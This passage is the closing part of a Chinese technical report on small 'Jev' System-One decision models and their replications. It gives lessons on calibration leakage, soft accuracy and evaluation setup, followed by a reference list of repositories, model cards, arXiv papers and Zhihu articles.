4. **校准温度泄漏是真实发生过的事故**（Laya issue #186、Phocinae 讨论 #25）：数据纪律比模型架构更容易决定一个 checkpoint 能不能用。
5. **概率形状比 argmax 难学**：Laya argmax 超过 Jev，但 soft accuracy（0.471 vs 0.580）反而落后——"选得对"和"概率贴得准"是两项能力。
6. **请求形态影响分数**：多问题合并请求与逐题请求结果可差约 5 个点（0.788 vs 0.843）；部署评测要按真实请求形态来。
7. **闭源官方信息的边界**：Jev 的 RLCD 只公开了训练目标方向，完整配方未公开；任何"完整复现官方 RLCD"的说法都应打问号。
8. **环境层风险（本团队运维观察）**：训练/服务主机曾出现文件系统只读重挂载（`errors=remount-ro`），长训练前应确认 checkpoint 输出盘可写、训练流程有崩溃自动重试。

---

## 11. 参考资料

### 一手：代码、权重与数据集

1. malevrigns, *AgentJev: A 0.6B System One Decision Model*（代码与协议）, 2026, Apache-2.0 — https://github.com/malevrigns/agent-jev
2. AgentJev v1 权重（发布修订 `7d433994…`，598,418,689 参数，BF16）与 coding-gates 分支（commit `359aa94b`）— https://huggingface.co/aimeigaoshou/agent-jev
3. LocalLLaMA, *Typed Decisions* 数据集卡（双榜单、教师自一致率、HF Jobs 跑分说明、讨论 #25/#37）— https://huggingface.co/datasets/LocalLLaMA/typed-decisions
4. AgentJev 同题对照报告 `typed_decisions/REPORT_zh.md`、`protocol.json`、`comparison.json` — https://github.com/malevrigns/agent-jev/tree/main/typed_decisions
5. coding-gates 数据与续训报告 `coding_gates/README.md` — https://github.com/malevrigns/agent-jev/tree/main/coding_gates
6. TreeEncoder benchmark 报告 `outputs/tree_benchmark_report.md` — https://github.com/malevrigns/agent-jev/tree/main/outputs
7. Convai Innovations, *Laya typed-decisions* 模型卡（RLCD 训练说明、局限与 issue #186）— https://huggingface.co/convaiinnovations/laya-typed-decisions
8. Laya 微调复现 notebook（2×T4 Kaggle）与代码 — https://github.com/NandhaKishorM/laya
9. 本地可复现训练工程（本团队工作区，含模型、训练、切分、校准与服务一条龙）— `/home/chenxiang.101/agents/jev/jev-trainer`（上游：`malevrigns/agent-jev`、数据集 `LocalLLaMA/typed-decisions`、底座 `Qwen/Qwen3-0.6B`）

### 研究论文（arXiv 编号已经官方 API 核实）

10. Nandakishor M, *SalesRLAgent: A Reinforcement Learning Approach for Real-Time Sales Conversion Prediction and Optimization*, arXiv:2503.23303, 2025-03-30
11. *Confidence-Aware Routing for Large Language Model Reliability Enhancement: A Multi-Signal Approach to Pre-Generation Hallucination Mitigation*, arXiv:2510.01237, 2025-09-23（知乎文章作"10 月"，日期以 arXiv 为准）

### 知乎与社区文章（观点与背景，关键事实已独立核实）

12. 莫叶何竹，《如何理解 Jev 模型中的 RLCD（面向校准决策的强化学习）？》 — https://www.zhihu.com/question/2086022553726990200/answer/2094528680584286865
13. 一脑袋浆糊，《比 Jev 架构更要紧的问题可能还是……低成本快速校准》（对"RL 做校准"的批评观点） — https://zhuanlan.zhihu.com/p/2088641712663027921
14. 大模型爱好者社区，《这应该是全网把"Jev 模型"讲得最透彻的文章了！》（三大开源复刻流派归纳；星标数为其写作时点，未采信） — https://zhuanlan.zhihu.com/p/2087592396758455187
15. 绝密伏击，《Jev 技术拆解》 — https://zhuanlan.zhihu.com/p/2091847058844029112
16. 魔搭社区，《Laya 开源：比 Jev 快 4 倍！421M 参数，33 毫秒完成 System 1 决策》 — https://zhuanlan.zhihu.com/p/2085760548034167437
17. 程序员鱼皮，《如何看待新模型 Jev》（实测：游戏决策与 697 篇文章打标） — https://www.zhihu.com/question/2083549123160925836/answer/2085408249600393527
18. 阿里巴巴中间件（刘军、姜泰航），《让 Agent 学会判断：从 JEV 接入到完整 Harness 决策流程》（AgentScope Java 集成） — https://zhuanlan.zhihu.com/p/2093407813783634200
19. 大模型爱好者社区，《Browser-Use 把 Jev 模型装进了浏览器 Agent！》（jev-ultrafast 双决策头；星标数未独立核实） — https://zhuanlan.zhihu.com/p/2085280913378825477
20. 梁川，《Jev：比 LLM 快百倍的 System One Model，把 AI 变成软件里的"智能 if 语句"》 — https://zhuanlan.zhihu.com/p/2084944605628441992

### 知识库内相关报告

21. 《Jev 决策小技术调研报告》 — `models/jev-decision/report.html`
22. 《基于 Qwen3.5-4B 的 Jev 决策模型训练方案设计》 — `models/jev-qwen35-4b/report.html`

---

*本报告全部实验数字均照抄一手来源（仓库协议文件、模型卡/数据集卡、本地训练 README 实测记录），未做二次外推；标注"知乎"的内容为社区观点或其写作时点数据。arXiv 编号与标题已经 arXiv 官方 API 逐一核实（2026-10-20）。*
